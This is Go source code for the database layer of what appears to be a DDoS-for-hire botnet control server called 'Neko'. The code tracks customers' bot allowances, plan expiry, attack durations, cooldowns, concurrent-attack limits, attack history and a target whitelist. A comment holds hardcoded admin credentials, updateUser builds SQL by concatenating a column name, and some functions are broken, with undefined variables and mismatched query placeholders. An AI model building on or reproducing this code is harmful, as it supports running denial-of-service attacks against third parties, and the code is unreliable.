package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
    _ "github.com/go-sql-driver/mysql"
    "time"
    "errors"
    "strings"
    "github.com/gliderlabs/ssh"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
    expdate     int64
    coolDown    int
    timeLimit   int
    ApitimeLimit   int
    connCurr   int
}

var mysqlcol []string = []string{"id", "username", "password", "conncurrents", "duration_limit", "api_duration_limit", "cooldown", "lastpaid", "max_bots", "admin", "redeemed", "api_key"}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println("Neko Connected to mysql database")
    return &Database{db}
}

//;insert;

func (this *Database) RemoveUser(username string) bool {
    rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
    return true
}

func (this *Database) updateUser(username string, column string, newValue string) bool {
    _, err := this.db.Query("update users set "+column+" = ? where username = ?", newValue, username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    return true
}


func (this *Database) RedeemCode(username string, password string, token string) bool {
    rows, err := this.db.Query("SELECT token FROM users WHERE token = ?", token)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("UPDATE `users` SET `username`='?' `password`='?' where token = ?", username, password, token)
    return true
}

func (this *Database) boolLogin(ctx ssh.Context, passwrd string) bool {
    baddr := strings.Split(ctx.RemoteAddr().String(), ":")
    fmt.Println("[NEKO:network] "+baddr[0]+" admin!")
    username := string(ctx.User())
    rows, err := this.db.Query("SELECT username, max_bots, concurrents, last_paid, cooldown, duration_limit, api_duration_limit, admin FROM users WHERE username = ? AND password = ?", username, passwrd)
    if err != nil {
        fmt.Println(err)
        return false
    }
    //defer rows.Close()
    if !rows.Next() {
        return false
    }
    return true
}
/*
func (this *Database) getUid(usr string) int {
    var totalAttacks int

    this.db.QueryRow("SELECT id FROM `users` WHERE username = ?", usr).Scan(
        &totalAttacks,
    )

    return totalAttacks
}
*/


func (this *Database) valueCheck(username string) (string, string, string, string, string, string, string) {
    rows, err := this.db.Query("SELECT max_bots, concurrents, last_paid, cooldown, duration_limit, api_duration_limit, admin FROM `users` WHERE username = ?", username)
    no := "No Value"
    if err != nil {
        return no,no,no,no,no,no,no
    }
    defer rows.Close()
    if !rows.Next() {
        return no,no,no,no,no,no,no
    }
    var maxBots, connCurr, expdate, coolDown, timeLimit, ApitimeLimit, admin string
    rows.Scan(&maxBots, &connCurr, &expdate, &coolDown, &timeLimit, &ApitimeLimit, &admin)
    return maxBots, connCurr, expdate, coolDown, timeLimit, ApitimeLimit, admin
}

func (this *Database) sshLogin(username string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, concurrents, last_paid, cooldown, duration_limit, api_duration_limit, admin FROM users WHERE username = ? ", username)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0, 0, 0, 0, 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0, 0, 0, 0, 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.connCurr, &accInfo.expdate, &accInfo.coolDown, &accInfo.timeLimit, &accInfo.ApitimeLimit, &accInfo.admin)
    return true, accInfo
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, concurrents, last_paid, cooldown, duration_limit, api_duration_limit, admin FROM users WHERE username = ? AND password = ?", username, password)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0, 0, 0, 0, 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0, 0, 0, 0, 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.connCurr, &accInfo.expdate, &accInfo.coolDown, &accInfo.timeLimit, &accInfo.ApitimeLimit, &accInfo.admin)
    return true, accInfo
}
//INSERT INTO users VALUES (NULL, 'lolinekos', 'lolicon0316', 10, 999999, 999999, 0, 9999999999999999, -1, 1, 'True', '');

/*
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `concurrents` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `api_duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `last_paid` bigint(8) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `redeemed` text,
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
*/
func (this *Database) RmWhitelist(ipprefix string, ipnetmask int) bool {
    rows, err := this.db.Query("DELETE FROM `whitelist` WHERE prefix = ? AND netmask = ?", ipprefix, ipnetmask)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM `whitelist` WHERE prefix = ? AND netmask = ?", ipprefix, ipnetmask)
    return true
}


func (this *Database) AddWhitelist(ipprefix string, ipnetmask int) bool {
    rows, err := this.db.Query("SELECT * FROM whitelist WHERE prefix = ?", ipprefix)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO whitelist (prefix, netmask) VALUES (?, ?)", ipprefix, ipnetmask)
    return true
}

func (this *Database) CreateUser(username string, password string, conncurrent int, expire int, max_bots int, admint int, duration int, api_duration int, cooldown int, randostr string) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, concurrents, max_bots, admin, last_paid, cooldown, duration_limit, api_duration_limit, api_key, redeemed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", username, password, conncurrent, max_bots, admint, int(expire) + int(time.Now().Unix()), cooldown, duration, api_duration, randostr, "False")
    return true
}

func (this *Database) FailedLog(Logtime string, username string, clientaddr string) bool {
    rows, err := this.db.Query("SELECT * FROM failed WHERE address = ?", clientaddr)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO failed (logtime, username, address) VALUES (?, ?, ?)", Logtime, username, clientaddr)
    return true
}

func (this *Database) UserLogs(Logtime string, username string, clientaddr string) bool {
    rows, err := this.db.Query("SELECT * FROM logins WHERE address = ?", clientaddr)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO logins (logtime, username, address) VALUES (?, ?, ?)", Logtime, username, clientaddr)
    return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, api_duration int, cooldown int, randostr string) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, api_duration_limit, apikey, redeemed) VALUES (?, ?, ?, 1, 999999999999999999999, ?, ?, ?, ?)", username, password, max_bots, cooldown, duration, api_duration, randostr, "False")
    return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        // Parse prefix
        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask { // Whitelist is less specific than attack target
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask { // Attack target is less specific than whitelist
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    return true
                }
            } else { // Both target and whitelist have same prefix
                if (iWhitelistPrefix == iAttackPrefix) {
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) activeAttacks() int {
    rows, err := this.db.Query("SELECT count(*) FROM history WHERE (time_sent + duration) > UNIX_TIMESTAMP()")
    if err != nil {
        fmt.Println(err)
        return 0
    }
    if !rows.Next() {
        return 0
    }
    var totalAtks int
    rows.Scan(&totalAtks)
    return totalAtks
}
/*
func (this *Database) activeAttacks() int {
    rows, err := this.db.Query("SELECT count(*) FROM history WHERE (time_sent + duration) > UNIX_TIMESTAMP()")
    if err != nil {
        fmt.Println(err)
        return 0
    }
    if !rows.Next() {
        return 0
    }
    var totalAtks int
    rows.Scan(&totalAtks)
    return totalAtks
}
*/
func (this *Database) getUid(usr string) int {
    var totalAttacks int

    this.db.QueryRow("SELECT id FROM `users` WHERE username = ?", usr).Scan(
        &totalAttacks,
    )

    return totalAttacks
}
/*
func (this *Database) APastAtk() []string {
    var totalAttacks []string

    this.db.QueryRow("SELECT * FROM (SELECT * FROM history ORDER BY id DESC LIMIT 10) sub ORDER BY id ASC;", usr).Scan(
        &lastAttacks,
    )

    return lastAttacks
}

func (this *Database) UserPastAtk(usr string) int {
    var totalAttacks int

    this.db.QueryRow("SELECT id FROM `users` WHERE username = ?", usr).Scan(
        &totalAttacks,
    )

    return totalAttacks
}


SELECT * FROM (SELECT * FROM history ORDER BY id DESC LIMIT 50) sub ORDER BY id ASC;
*/
func (this *Database) allAtks() int {
    var totalAttacks int

    this.db.QueryRow("SELECT COUNT(*) FROM `history`").Scan(
        &totalAttacks,
    )

    return totalAttacks
}

func (this *Database) countUsers() int {
    var totalAttacks int

    this.db.QueryRow("SELECT COUNT(*) FROM `users`").Scan(
        &totalAttacks,
    )

    return totalAttacks
}

func (this *Database) currrentAtks() int {
    var totalAttacks int

    this.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE `time_sent` + `duration` > ?", time.Now().Unix()).Scan(
        &totalAttacks,
    )

    return totalAttacks
}

func (this *Database) userAtks(usr int) int {
    var totalAttacks int

    this.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE `time_sent` + `duration` > ? AND user_id = ?", time.Now().Unix(), usr).Scan(
        &totalAttacks,
    )

    return totalAttacks
}

func (this *Database) checkAttacks(username string) int {
    rows, err := this.db.Query("SELECT id FROM users WHERE username = ?",username)
    if err != nil {
        fmt.Println(err)
        return 0
    }
    if !rows.Next() {
        return 0
    }
    var uid int
    rows.Scan(&uid)
    rows.Close()
    rows, err = this.db.Query("SELECT count(*) FROM history WHERE (time_sent + duration) > UNIX_TIMESTAMP() AND user_id = ?", uid)
    if err != nil {
        fmt.Println(err)
        return 0
    }
    var totalAtks int
    rows.Scan(&totalAtks)
    return totalAtks
}
/*
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, duration_limit, last_paid, admin, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, expires, admin, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Neko╼➤   This user has been removed")
    }
    rows.Scan(&userId, &durationLimit , &expires, &admin, &cooldown)

    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("Neko╼➤   You may not send attacks longer than %d seconds.", durationLimit))
    }
    if int(expires) < int(time.Now().Unix()){
        return false, errors.New("Neko╼➤   Plan Expired!!!")
    }
    rows.Close()
    
    if admin == 0 {
        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            return false, errors.New(fmt.Sprintf("Neko╼➤   Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    return true, nil
}
*/

func (this *Database) underAttack(host string) bool {
    rows, err := this.db.Query("select * from history where command = ?", host)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }

    if !rows.Next() {
        return true
    }

    return false
}


func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, duration_limit, last_paid, admin, cooldown, concurrents FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, expires, admin, cooldown, conncurr uint32
    if !rows.Next() {
        return false, errors.New("Neko╼➤   This user has been removed")
    }
    rows.Scan(&userId, &durationLimit , &expires, &admin, &cooldown, &conncurr)

    if durationLimit < 15 || duration > durationLimit {
        return false, errors.New(fmt.Sprintf("Neko╼➤   You may not send attacks longer than %d seconds.", durationLimit))
    }

    if !database.underAttack(command) {
        return false, errors.New(fmt.Sprintf("Neko╼➤   This host is already under attack!"))
    }

    //timenowint := int(time.Now().Unix())
    //expires = int(expires)
    if int(expires) < int(time.Now().Unix()){
        //expiresint := int(expires)
        //timenowint := int(time.Now().Unix())
        fmt.Println("Neko╼➤   Dev log exptime  ", expires,"  |   timenow  ",time.Now().Unix())
        return false, errors.New("Neko╼➤   Plan Expired!!! ")

    }
    rows.Close()
    if admin == 0 {
        rows, err = this.db.Query("SELECT count(id), time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        var activeAtks, timeSent, historyDuration uint32
        if !rows.Next() {
            return false, errors.New("Neko╼➤   ERROR!!!")
        }
        rows.Scan(&activeAtks, &timeSent, &historyDuration)
        if int(activeAtks) > int(conncurr-1) || conncurr < 1{
            return false, errors.New(fmt.Sprintf("Neko╼➤   Please wait %d seconds before sending another attack\r\n         You are limited to %d attacks, there are %d active attacks", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix()), conncurr, activeAtks))
            
        }
    }

    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    return true, nil
}

func (this *Database) CanLaunchApi(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, api_duration_limit, last_paid, admin, cooldown, concurrents FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, expires, admin, cooldown, conncurr uint32
    if !rows.Next() {
        return false, errors.New("Neko╼➤   This user has been removed")
    }
    rows.Scan(&userId, &durationLimit , &expires, &admin, &cooldown, &conncurr)

    if durationLimit < 15 || duration > durationLimit {
        return false, errors.New(fmt.Sprintf("Neko╼➤   You may not send attacks longer than %d seconds.", durationLimit))
    }

    //timenowint := int(time.Now().Unix())
    //expires = int(expires)
    if int(expires) < int(time.Now().Unix()){
        //expiresint := int(expires)
        //timenowint := int(time.Now().Unix())
        return false, errors.New("Neko╼➤   Plan Expired!!! ")

    }
    rows.Close()

    if admin == 0 {
        rows, err = this.db.Query("SELECT count(id), time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        var activeAtks, timeSent, historyDuration uint32
        if !rows.Next() {
            return false, errors.New("Neko╼➤   ERROR!!!")
        }
        rows.Scan(&activeAtks, &timeSent, &historyDuration)
        if int(activeAtks) > int(conncurr-1) || conncurr < 1{
            return false, errors.New(fmt.Sprintf("Neko╼➤   Please wait %d seconds before sending another attack\r\n         You are limited to %d attacks, there are %d active attacks", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix()), conncurr, activeAtks))
            
        }
    }
    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    return true, nil
}
func (this *Database) TryKey(apikey string, username string, password string) bool {
    rows, err := this.db.Query("SELECT redeemed FROM users WHERE api_key = ?", apikey)
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    if !rows.Next() {
        return false
    }
    var redeemed string
    rows.Scan(&redeemed)
    if redeemed == "True"{
        fmt.Sprintf("\033[0mKey has already been claimed\r\n")
        return false 
    }
    this.db.Exec("UPDATE users SET username=?, password=?, redeemed=? WHERE api_key = ?", username, password, "True", apikey)
    return true
}
/*
func RandomString(n int) string {
    var letter = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

    b := make([]rune, n)
    for i := range b {
        b[i] = letter[rand.Intn(len(letter))]
    }
    return string(b)
}*/